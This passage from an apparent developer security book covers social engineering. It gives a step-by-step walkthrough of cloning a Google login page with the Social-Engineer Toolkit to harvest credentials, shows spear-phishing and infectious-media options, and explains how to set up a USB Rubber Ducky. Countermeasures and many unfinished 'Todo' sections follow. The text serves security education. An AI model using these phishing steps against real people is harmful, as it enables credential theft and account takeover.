I> Using the Credential Harvester from the Social Engineer Toolkit (SET) or setoolkit in Kali Linux. This uses the `HTML` `referer` header, in which it intercepts the request that comes from the victims IP address and harvests the posted credential fields. We demonstrate a similar attack on a XSS vulnerable website that we have hooked with BeEF, where we use BeEFs "Pretty Theft" module to harvest the victims credentials when they log in to the website in the [Cross-Site Scripting (XSS)](#web-applications-identify-risks-cross-site-scripting) section in chapter 12 Web Applications.  
I> Social engineer our victim to our cloned website.  
I> Once victim enters their credentials and submits, SET harvests the credentials.  
I> They are redirected to the original website to make it look less conspicuous, kind of like a failed log-in.  
I> Making the URL look more legitimate is covered in the [ARP](#network-identify-risks-spoofing-arp) and [DNS](#network-identify-risks-spoofing-dns) spoofing section in the Network chapter.

{icon=bomb}
G> ## The Play
G>
G> Clear out the public web directory (`/var/www/`) on your Kali Linux machine. If you do not, SET will archive what is already in there.
G>
G> Run `setoolkit`.
G>
G> Choose:  
G> `Select: 1) Social-Engineering Attacks`
G>
G> `Select: 2) Website Attack Vectors`
G>
G> `Select: 3) Credential Harvester Attack`
G>
G> `Select: 2) Site Cloner`
G>
G> Enter IP address that SET listens on to capture the key log. In this case it will be your local IP address.
G>
G> We clone accounts.google.com
G>
G> SET now hosts cloned and php files in the apache web dir `/var/www/` and starts apache if it’s not already running.
G>
G> Now we see the cloned artefacts and the key log file `harvester_<yyyy-mm-dd HH:mm:ss.n>.txt` in `/var/www/` which will be currently empty.
G>
G> The target clicks the link that was passed to them via social engineering. At this stage this is just the IP address that SET cloned and hosted your website from. Your cloned website is loaded in the victims browser. This could be any site that you know the victim has credentials for that you would like. As soon as the victim posts (as discussed above in the synopsis) SET:
G>
G> 1) intercepts the request
G>
G> 2) harvests the credentials
G>
G> 3) writes to the harvest file
G>
G> 4) and the page redirects to the real accounts.google.com.
G>
G> Now if you have a look in the `/var/www/harvester_<yyyy-mm-dd HH:mm:ss.n>.txt` file, you will find the targets credentials.

T> ## Crafting Emails with SET
T>
T> SET provides the ability to craft emails with spoofed from address. You just need to install and configure sendmail.  
T> As you can see below, SET also has a few other options for helping an attacker craft spear-phishing attacks.

{linenos=off}
                          ..:::::::::..
                      ..:::aad8888888baa:::..
                  .::::d:?88888888888?::8b::::.
                .:::d8888:?88888888??a888888b:::.
              .:::d8888888a8888888aa8888888888b:::.
             ::::dP::::::::88888888888::::::::Yb::::
            ::::dP:::::::::Y888888888P:::::::::Yb::::
           ::::d8:::::::::::Y8888888P:::::::::::8b::::
          .::::88::::::::::::Y88888P::::::::::::88::::.
          :::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::
          :::::::Y88888888888P::|::Y88888888888P:::::::
          ::::::::::::::::888:::|:::888::::::::::::::::
          `:::::::::::::::8888888888888b::::::::::::::'
           :::::::::::::::88888888888888::::::::::::::
            :::::::::::::d88888888888888:::::::::::::
             ::::::::::::88::88::88:::88::::::::::::
              `::::::::::88::88::88:::88::::::::::'
                `::::::::88::88::P::::88::::::::'
                  `::::::88::88:::::::88::::::'
                     ``:::::::::::::::::::''
                          ``:::::::::''
    
    [---]        The Social-Engineer Toolkit (SET)         [---]
    [---]        Created by: David Kennedy (ReL1K)         [---]
    [---]                  Version: 6.3                    [---]
    [---]              Codename: '#HugLife'                [---]
    [---]        Follow us on Twitter: @TrustedSec         [---]
    [---]        Follow me on Twitter: @HackingDave        [---]
    [---]       Homepage: https://www.trustedsec.com       [---]
    
            Welcome to the Social-Engineer Toolkit (SET). 
             The one stop shop for all of your SE needs.
    
         Join us on irc.freenode.net in channel #setoolkit
    
       The Social-Engineer Toolkit is a product of TrustedSec.
    
                 Visit: https://www.trustedsec.com
    
     Select from the menu:
    
       1) Spear-Phishing Attack Vectors
       2) Website Attack Vectors
       3) Infectious Media Generator
       4) Create a Payload and Listener
       5) Mass Mailer Attack
       6) Arduino-Based Attack Vector
       7) Wireless Access Point Attack Vector
       8) QRCode Generator Attack Vector
       9) Powershell Attack Vectors
      10) Third Party Modules
    
      99) Return back to the main menu.
    
    set> 1
    
     The Spearphishing module allows you to specially craft email messages and send
     them to a large (or small) number of people with attached fileformat malicious
     payloads. If you want to spoof your email address, be sure "Sendmail" is in-
     stalled (apt-get install sendmail) and change the config/set_config SENDMAIL=OFF
     flag to SENDMAIL=ON.
    
     There are two options, one is getting your feet wet and letting SET do
     everything for you (option 1), the second is to create your own FileFormat
     payload and use it in your own attack. Either way, good luck and enjoy!
    
       1) Perform a Mass Email Attack
       2) Create a FileFormat Payload
       3) Create a Social-Engineering Template
    
      99) Return to Main Menu
    
    set:phishing>

### Infectious Media {#people-identify-risks-infectious-media}
![](images/ThreatTags/average-widespread-average-severe.png)

Infectious media is generally thought about as a tool used by:

1. **An Attacker with Physical Access**. The payload can be used to do pretty much anything. Often used when it is easier to insert directly into a computer than remotely deploying a payload. For example an attacker can masquerade as a service person, contractor, or what ever looks legitimate enough to get them physical access. Often only a few seconds are required to insert the media, deposit and/or run a payload, or vacuum up some target data, pull the media out and be off.
2. **An Attacker with No Access**. Handing out or leaving lying around somewhere where the target will notice and their curiosity will drive them to insert the media themselves, thus doing a large part of the attackers job for them. As always, social engineers leverage the human targets weaknesses against the target to carry out the attackers bidding. 

#### [Social Engineering Toolkit (Set)](http://www.social-engineer.org/framework/se-tools/computer-based/social-engineer-toolkit-set/)

Set has an Infectious Media Generator allowing the person running Set to create a Metasploit based payload with an autorun.inf file that once put onto the USB stick or optical media, will run the chosen payload automatically on insertion.

Quite a few file formats are supported to cloak the payload, like PDF, Word documents and many others. Pretty much any type of payload an attacker can dream up can be used.

##### [Teensy USB HID](https://www.pjrc.com/teensy/)

The Teensy USB device as a [penetration testing device](http://www.irongeek.com/i.php?page=security/programmable-hid-usb-keystroke-dongle) overcomes running payloads on the target machine the same way a keyboard or Rubber Ducky would. Because it is a Human Interface Device (HID) it is trusted by most OSs. It can be conceiled in any type of USB hardware. That alone creates a huge vector for exploitation. The Teensy has similar specifications to the Rubber Ducky but is about half the price. It is just a development board though, that has to be programmed via an Arduino. Set provides the reverse shells, listeners and a good selection of exploits out of the box. Metasploit is at your disposal as usual with Set and attack vectors such as PowerShell, wscript and others are available.

#### [USB Rubber Ducky](http://usbrubberducky.com/)

The USB standard has a HID specification, which means any USB device that says it is a keyboard will be automatically accepted by most OSs. 

The main Duckyscript Encoder which is a Java application that converts the ducky script files into hex code, so you can load them on your micro SD card, insert the card into the ducky and social engineer your ducky into your targets computer, can be downloaded from the hak5darren github accounts USB-Rubber-Ducky repository [Downloads page](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Downloads) on the wiki.

The source code for the encoder and firmware are in the same repository although the official encoder only supports US keyboards.  
If you need additional keyboard support you are going to have to use the encoder.jar from the midnitesnake github accounts usb-rubber-ducky repository [Encoder folder](https://github.com/midnitesnake/USB-Rubber-Ducky/tree/master/Encoder).

If and when you need to re-flash ducky, you can find the directions in the same wiki under the [Flashing-ducky](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Flashing-ducky) page

What I found was that the [official encoder](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Downloads) didn't actually work for me. It created a different binary to that of the [online encoder](http://ducktoolkit-411.rhcloud.com/Encoder.jsp) and the [midnitesnake encoder](https://github.com/midnitesnake/USB-Rubber-Ducky/blob/master/Encoder/encoder.jar) which both created correct binaries. How I found out the problem was to use the midnitesnake [decode perl script](https://github.com/midnitesnake/USB-Rubber-Ducky/blob/master/Decode/ducky-decode.pl) against the binary generated by the official hak5darren encoder and then the online and midnitesnake encoders.

My ducky script looked like the following:

{title="Hello World ducky script", linenos=off}
    DELAY 3000
    ALT F2
    DELAY 200
    STRING pluma
    ENTER
    DELAY 200
    STRING Hello World!!!
    ENTER
    STRING Hello World!!!
    ENTER

Encoded with the official encoder and then decoded with the midnitesnake decoder I got the following which had a different hex value on the first line of the output:

{title="decode", linenos=off}
    ./ducky-decode.pl -f inject.bin

{title="result", linenos=off}
    00ff 003c b32e 
    DELAY 200
     p l u m a 
    ENTER
     
    DELAY 200
     H e l l o 
    SPACE
     W o r l d ! ! ! 
    ENTER
     H e l l o 
    SPACE
     W o r l d ! ! ! 
    ENTER
     %                                                                 

Encoded with the online encoder or the midnitesnake encoder and then decoded with the midnitesnake decoder I got:

{title="decode", linenos=off}
    ./ducky-decode.pl -f inject.bin

{title="Result", linenos=off}
    00ff 003c b340 
    DELAY 200
     p l u m a 
    ENTER
     
    DELAY 200
     H e l l o 
    SPACE
     W o r l d ! ! ! 
    ENTER
     H e l l o 
    SPACE
     W o r l d ! ! ! 
    ENTER
     %     

Before we go any further, the community provided source and artefacts seem to work better (from an attackers perspective).  
This is how I set-up my work-flow:

I didn't use a Kali Linux VM for this, because it is just easier to use a physical machine when you are inserting and removing USB holders continuously, so on my Mint machine, I:

1. `cd /opt && mkdir usb-rubber-ducky && cd usb-rubber-ducky`
2. `wget https://github.com/midnitesnake/USB-Rubber-Ducky/raw/master/Decode/ducky-decode.pl`
3. Make it executable: `chmod u+x ducky-decode.pl`
4. `wget https://github.com/midnitesnake/USB-Rubber-Ducky/raw/master/Encoder/encoder.jar`
5. Now put the supplied micro SD card into the USB holder and plug it into an empty USB port. Now we are ready to fill it with a payload.

My workflow went like this:

1. In one terminal pane I'd have my text file `inject.txt` open in vim. In this file I would write my ducky script and save.
2. In another terminal pane in the directory `/opt/usb-rubber-ducky/` I would run `java -jar encoder.jar` and this provides the options you need to create your payload. So you can run `java -jar encoder.jar -i inject.txt -o /media/<you>/<name of micro SD card>/inject.bin`.
3. Pull your USB holder out and put the card into the ducky. Now it is set for someone to plug it into their USB port and have the payload run.

Using ducky script and the existing community provided payloads as examples, the imagination is the only real limiting factor of what you can easily do with the USB Rubber Ducky, or any infectious media for that matter. For example:

* [Extracting passwords and hashes from memory](https://hak5.org/episodes/hak5-1503) without Anti-Virus detecting it
* Reverse shells
* [Android attacks](https://hak5.org/episodes/hak5-1216)
* Basically any payload you can dream up

Just make sure when you are testing your malware that you do it in a lab environment before the targets environment.

## 3. SSM Countermeasures

### [Morale, Productivity and Engagement Killers](https://speakerdeck.com/binarymist/how-to-increase-software-developer-productivity) {#people-countermeasures-morale-productivity-and-engagement-killers}

Staff are often thought of as resources. If you want the best out of your people, treat them like valuable assets. Go out of your way to build meaningful relationships with them and create empathy. People base their decisions on emotions, later justifying them with facts. With this in mind, keep them in a good emotional place. Staff that feel appreciated work much harder and will be more likely to:

  * be conscientious about everything including following organisational policy
  * remain engaged and be alert
  * have the organisations best interests at heart
  * Not bad mouth their seniors behind their backs
  * Withhold confidential information from anyone eliciting
  * Bake as much quality into everything that they know how to

#### Undermined Motivation
![](images/ThreatTags/PreventionEASY.png)

If you are a manager do not screw your workers. It may sound obvious, but I still see it happening in many organisations. Software Engineers are smart people that have paid a price to get into the field they work in. They are self motivated. Product Owners (POs) or managers have a strong influence on how motivated they remain. If POs or managers are smart, they will do everything in their power to feed the engineers appetite to excel.

#### Adding people to a Late Project
![](images/ThreatTags/PreventionAVERAGE.png)

Throwing more engineers at a problem usually makes it worse. The only definite way to get something built faster is to build a smaller thing. The best way to detect whether this is or going to be a problem. Simply asking the developers. If they are professionals, they'll give you an honest answer and there is a high chance they'll know more than anyone else.

#### Noisy, Crowded Offices
![](images/ThreatTags/PreventionEASY.png)

Allow your developers to create a space that they love working in. When I work from home my days are far more productive than when working for a company that insists on cramming as many workers around you into as small and often noisy a space as possible.
   
#### Email {#people-countermeasures-morale-productivity-and-engagement-killers-email}
![](images/ThreatTags/PreventionEASY.png)

We have many communication tools that are far more effective than email. Let us use them. In order of effectiveness, we have:

1. Face to face. You can not beat this. It uses as many of our senses as possible and includes the human spirit. Those that are aware need to encourage developers to talk to whoever it is they are working with face to face if it is practical.
2. Audio Visual. We have cyber networks now, the internet, and many great AV tools for one on one and team collaboration. I could list all the tools I know of and/or use, but this landscape is constantly evolving. Find what works for you and your teams. Many people find that using a good AV tool fits their work flow better than physical face to face communications. This is because it allows workers to have the best of both worlds. It gives them their own space and at the push of a button allows them to see their co-worker(s) and hear them. I have personally found good AV tools to be very liberating and great productivity enhancers.
3. Audio only. Push to talk. The likes of Mumble can be an excellent staple tool for talking things through during the working day, when you do not need that extra information that the visual aspect provides. I have used this on many occasions and found it to be a very effective medium. When you do need more, then you can just escalate to a higher form of communication with the added visual component.
4. Phone calls are similar to Push to talk, but the context switching overhead is larger, because you have to dial, often put a headset on and wait for an answer. Audio quality is often worse also.
5. Instant Messaging (IM) tools. These are great for quick short communication sessions where you need to pass links and/or have a quick discussion where you do not need the additional overhead of audio. There is often little context switching overhead. It is easy to work and talk with co-workers. You are really starting to loose a large percentage of the communication information here though. Misunderstandings can creep in. Always be ready to escalate to a higher level of communication.
6. Email. Leave this as a last resort. It is ineffective and costly in many ways. Especially for software engineers, where there is a high price for context switching. Software engineers and architects have to build large landscapes of the programmes they are working on in their heads before they can start to make any changes. Essentially loading a programme into memory and wrapping our human understanding of how the mechanics work around it. If a developer has this picture loaded into their memory and then switches to deal with an email, a large part of the picture can easily drop out of memory. Once the email work is finished, the developer has to re-load the picture. Second time around is quicker, but this can still be very costly.

Also do not forget there are many live collaborative drawing, documenting and coding tools available now. These can actually make a work-flow far more effective than being in the same room as co-workers but having to work on one set of screens, as you can both work form your own workstations on the same work.
   
#### Meetings
![](images/ThreatTags/PreventionEASY.png)

Find out when the most productive times are for developers and let them own that time. Often developers work late because it is the only time they do not get interrupted and they have quiet time to concentrate. If your a Product Owner or Manager, make sure your developers have plenty of uninterrupted time to work their magic. Schedule meetings in the least productive part of the day. It may sound obvious, but ask developers when this is. A managers role is to facilitate for the developers and get out of their way. Let them manage themselves.

This is where professional developers will shine. If they feel like they are being pulled into to many meetings and their productivity is suffering, they will speak up. Just beware that many developers will not though.

#### Context Switching
![](images/ThreatTags/PreventionAVERAGE.png)

Do not do it. This is a real killer. This is hard. What you need to do is be aware of how much productivity is killed with each switch. Then do everything in your power to make sure the Development Team is sheltered from as much as possible. There are many ways to do this. For starters, you are going to need as much visibility as possible into how much this is currently happening. track add-hock requests and any other types of interruptions that steal the developers concentration.  
In a previous Scrum Team that I was Scrum Master of, The Development Team decided to include another metric to the burn down chart that was on the middle of the wall, clearly visible to all. Every time one of the developers was interrupted during a Sprint, they would record this time, the reason and who interrupted them, on the burn down chart. The Scrum Team would then address this during the [Retrospective](http://blog.binarymist.net/2012/07/28/guidance-on-running-scrum-retrospectives/) and empirically address why this happened and work out how to stop it happening every Sprint. Jeff Atwood has an informative post on why and how context-switching/multitasking kills productivity. Be sure to check it out.

"_The trick here is that when you manage programmers, specifically, task switches take a really, really, really long time. That's because programming is the kind of task where you have to keep a lot of things in your head at once. The more things you remember at once, the more productive you are at programming. A programmer coding at full throttle is keeping zillions of things in their head at once: everything from names of variables, data structures, important APIs, the names of utility functions that they wrote and call a lot, even the name of the subdirectory where they store their source code. If you send that programmer to Crete for a three week vacation, they will forget it all. The human brain seems to move it out of short-term RAM and swaps it out onto a backup tape where it takes forever to retrieve._"

> Joel Spolsky

#### Top Developer Motivators in Order {#people-countermeasures-morale-productivity-and-engagement-killers-top-developer-motivators-in-order}
![](images/ThreatTags/PreventionEASY.png)

1. Developers love to develop software. The best way to motivate developers is to let them develop. Provide an environment to stimulate focus.
2. The Work it self
  * Variety of Skills. Developers enjoy freedom and expectation to exercise a variety of skills, thus producing 'T' shaped developers, those with broad experience and some deep specialities.
  * Responsibility, Significance. People who tighten nuts on air-planes will feel that their work is more important and meaningful than people who tighten nuts on decorative mirrors. Developers must experience meaning in their work.   
  * Task Identity. People care more about their work when they can complete whole and identifiable pieces of work. User Stories for example.   
  * Consumer and Pair Association. Knowing the results of their work and how it affects others   
  * Autonomy. Control over what and how they perform their work. Self managing teams. Many managers still need to realise that they can be freed up from a lot of work if they will just let the Development Team manage their own destiny.
3. Ownership / Buy-in. People work harder to achieve their own goals than someone else's. The Team decides how much it wants to tackle, the developer decides what to tackle. The schedules developers create are always ambitious. This is why Scrum, when run by the book can be very effective.   
4. Goal Setting. Setting objectives for developers works, but only pick 1 or 2.
More than that and developers loose the focus. Developers do not respond well to objectives that change daily or are collectively impossible to
meet.   
5. Opportunities for Growth. Half of what a developer knows in order to do his job today will be out of date in 3 years time. If not moving forward in this industry, you are moving backwards. Developers are very motivated by learning new things. Let developers determine how they wish to grow professionally. The best developers will gravitate toward organisations that foster personal growth.
6. Personal Life. Top developers like to invest a lot in their own time (experimenting, researching, teaching others, running events). Let them, and in-fact encourage them.
7. Technical Leadership. Top developers love passing on their knowledge. This is part of what drives them. Assign each team member to be technical lead (sometimes referred to as champion) and possibly mentor for a particular domain, technology and process area.

### Employee Snatching
![](images/ThreatTags/PreventionDIFFICULT.png)

A lot of combating snatching of staff comes down to the countermeasures of [Morale, Productivity and Engagement Killers](#people-countermeasures-morale-productivity-and-engagement-killers).

#### Exit Interviews

_Todo_

%% Remove accounts from everything. domains, databases, APs, email, cloud applications/storage, etc

### Weak Password Strategies {#people-countermeasures-weak-password-strategies}

Defeating compromise is actually very simple, but few follow the guidelines. Everyone else is being exploited now or later, whether they are aware of it or not.

* Good passwords should be long and complex enough that you are unable to remember them
* Mix of random or at worst pseudorandom alphanumeric, upper/lower case, special characters. Get yourself a [OneRNG](http://onerng.info/) for generating true randomness.
* Swapping characters with numbers and special characters do not really make compromise much harder
* Unique for every account
* Use password database (ideally multi factor authentication) that generates passwords for you based on criteria you set. This way the profiling attacks mentioned are going to have a tough time brute forcing your accounts. It is such simple and easy to implement advice, but still so many are failing to take heed.

### Phone Calls {#people-countermeasures-phone-calls}
![](images/ThreatTags/PreventionDIFFICULT.png)

Even the most technically and security focussed people can be played.

Focus on the low hanging fruit. Social Engineering attacks via phone calls is definitely one of the lowest. Using the output from the various risk rating and ranking of threats from [2 SSM Identify Risks](#people-identify-risks) will help you realise this.  
Make sure that people being trusted are trustworthy. Test them. Most attacks target trusted people because they have something of value. Make sure the amount of value they have access to is in proportion to how trustworthy they actually are. Do not assume. Educate (train) and test employees. Make sure they are well compensated. Do what ever it takes to keep their levels of passion and engagement high. People with these qualities will be far more likely to succeed in recognising and warding off attacks.

Developing simple scripts or process flow charts for employees to check when receiving calls can be helpful. For example requesting the callers employee ID and name and not answering any further questions until you get it. Some queries like password or other sensitive data requests should also never be complied with. Any queries outside of what the employee is allowed to answer should be referred to the supervisor. Just having these sorts of process flows documented provides assurity and comfort to the employees taking the calls.

### Spoofing Caller Id {#people-countermeasures-spoofing-caller-id}

![](images/ThreatTags/PreventionDIFFICULT.png)

Do not rely on caller Id. It is untrusted. I am not aware of any way to successfully [detect](http://www.cse.sc.edu/~mustafah/download/cid_USC_CSE_TR-2013-001.pdf) caller Id spoofing before the call is answered.

With SMS, the first line of detection is to respond to the number that was spoofed confirming any information in the initial message. This will rule out many services. Failing that, confirmation by calling the sender and recognising their voice, will go a long way. Next line of defence would be to contact them via some other means, email, or face to face is always going to be the best. Work you way through the list of communication techniques from the [Email](#people-countermeasures-morale-productivity-and-engagement-killers-email) section above.

### Favour for a Favour {#people-countermeasures-favour-for-a-favour}
![](images/ThreatTags/PreventionAVERAGE.png)

If someone you do not know does you a favour then asks for a favour. You are probably being played. Get suspicious. Start thinking hard about what they are actually asking for. 

### The New Employee {#people-countermeasures-the-new-employee}
![](images/ThreatTags/PreventionAVERAGE.png)

All employees must be educated in that they should never reveal their passwords. It does not matter who to. If a password is asked for, suspicions should be instantly raised to finding out the identity of the requester, as they are obviously malicious or extremely ill-informed. This is often a good candidate to practise reverse social engineering on the requester, finding out as much about the person and what they are after as possible without raising suspicions that their disguise has been identified.

### We Have a Problem {#people-countermeasures-we-have-a-problem}
![](images/ThreatTags/PreventionAVERAGE.png)

Many of the social engineering attacks put a focus on a problem that does not exist, but sounds very real. If the pretend problem could stop the victim from getting their work done, that will provide more leverage and more willingness on the part of the victim to give up sensitive data that they otherwise would not.

### It's Just the Cleaner {#people-countermeasures-its-just-the-cleaner}
![](images/ThreatTags/PreventionVERYEASY.png)

1. Think. Respect your workers. Provide them with the visibility as to who is allowed access to where and when.
2. Train your workers
3. Test them. Send some random in without telling your workers and see what happens. Adjust your training to suite

### Tailgating {#people-countermeasures-tailgating}
![](images/ThreatTags/PreventionAVERAGE.png)

&nbsp;

All of these attacks require: Train -> Monitor -> Test, repeat

Creating an organisation wide single point of contact that can process all security related concerns will help to see when an attack is in progress, as in most cases, the attacker(s) will be making multiple attempts to pre-load and elicit sensitive information. Often from multiple targets. Emphasise that employees should contact that single point at even the slightest feeling of something being a bit suspicious.

If you took the people out of the security equation, there would be no insecurities. People are the source of (I am fairly sure) all of the security issues we face today. So realistically, this is where we need to focus most of our attention. Education, establishing cultures of people that understand the issues, are prepared to and expect to be played and can and do react appropriately. 

### Phishing

_Todo_

### Spear Phishing

The most effective way to teach people about the dangers of spear phishing, how it can be avoided and why it matters, is to actually test them. Training and lecturing does little to improve the situation.

Test the following:

* Will a target click on a link in an email sent to them? The email may have a spoofed from address and contain information specifically targeted and attractive to the target.
* Will a target visit a website based on a link passed to them and enter either personal or business related information?

### Infectious Media
![](images/ThreatTags/PreventionAVERAGE.png)

This is very simple, but hard to implement. Lets look at the two delivery mechanisms discussed in the Identify Risks section:

#### An Attacker with Physical Access.

Staff need to be aware of who is permitted to be in the premises at any given time. Staff need to be empowered to feel free and be engaged enough to ask anyone they do not recognise who they are, what they are doing and obtain identification and even confirm with the person that authorised them to be there. In other words, being engaged, educated, alert and empowered.  
Remember people are both our strongest and weakest links. We can use technology to help, but people will always find a way around technology and only other people will be able to stop them.

#### An Attacker with No Access.

Handing out or leaving lying around somewhere where the target will notice and their curiosity will drive them to insert the media themselves.

Curiosity in humans is a strong force and when used by an attacker against a target a very effective one. It is hard to train people to resist a natural instinct, but if you think back to cases as a child where you would do something out of curiosity and the result was pain? Pain is an undeniably effective medium for learning. Until you have actually been bitten, as humans we are likely to keep doing what ever it is that we think will satisfy our curiosity.

Some organisations resort to disabling physical ports on their machines. While this is a somewhat effective measure, it can also play a part in crippling productivity in an organisation.

Treating your workers well as discussed in the [Morale, Productivity and Engagement Killers](#people-countermeasures-morale-productivity-and-engagement-killers) section helps on top of training, but again you will be fighting this invisible force of curiosity. It is worth actually carrying out tests on your workers at seemingly random intervals and measuring the success of the results and then discussing them with the employee that has failed or passed the test. Provide positive reinforcement to those that do not succumb to the attack. Possibly even publicly within the organisation, which will also help others learn. These concerns are made smaller by talking about them. Provide constructive criticism and additional training to those that do succumb to the attack.

## 4. SSM Risks that Solution Causes
Often the modern thinking is that we can replace flawed people with technology. People are resilient and dynamic. They can spot a threat they have never seen before and defend against it. Computers can only defend against what they have been programmed to defend against. Technological defences are brittle. It is the role of technology to support humans to make good decisions.

Employees can get complacent with training, unless they are faced with very real simulations. Get creative, establish a base line training for all and additional training for areas of specialisation and extra trust. 

_Todo_

### Morale, Productivity and Engagement Killers

_Todo_

#### Undermined Motivation

_Todo_

#### Adding people to a Late Project

_Todo_

#### Noisy, Crowded Offices

_Todo_

#### Email

_Todo_

#### Meetings

_Todo_

#### Context Switching

_Todo_

#### Top Developer Motivators in Order

_Todo_

### Employee Snatching

_Todo_

#### Exit Interviews

_Todo_

### Weak Password Strategies

_Todo_

### Phone Calls

_Todo_

### Spoofing Caller Id

_Todo_

### Favour for a Favour

_Todo_

### The New Employee

_Todo_

### We Have a Problem

_Todo_

### It’s Just the Cleaner

_Todo_

### Tailgating

_Todo_

### Phishing

_Todo_

### Spear Phishing

_Todo_

### Infectious Media

_Todo_


## 5. SSM Costs and Trade-offs


### Morale, Productivity and Engagement Killers

_Todo_

#### Undermined Motivation

_Todo_

#### Adding people to a Late Project

_Todo_

#### Noisy, Crowded Offices

_Todo_

#### Email

_Todo_

#### Meetings

_Todo_

#### Context Switching

_Todo_

#### Top Developer Motivators in Order

_Todo_

### Employee Snatching

_Todo_

#### Exit Interviews

_Todo_

### Weak Password Strategies

_Todo_

### Phone Calls

_Todo_

### Spoofing Caller Id

_Todo_

### Favour for a Favour

_Todo_

### The New Employee

_Todo_

### We Have a Problem

_Todo_

### It’s Just the Cleaner

_Todo_

### Tailgating

_Todo_

### Phishing

_Todo_

### Spear Phishing

_Todo_

### Infectious Media

_Todo_

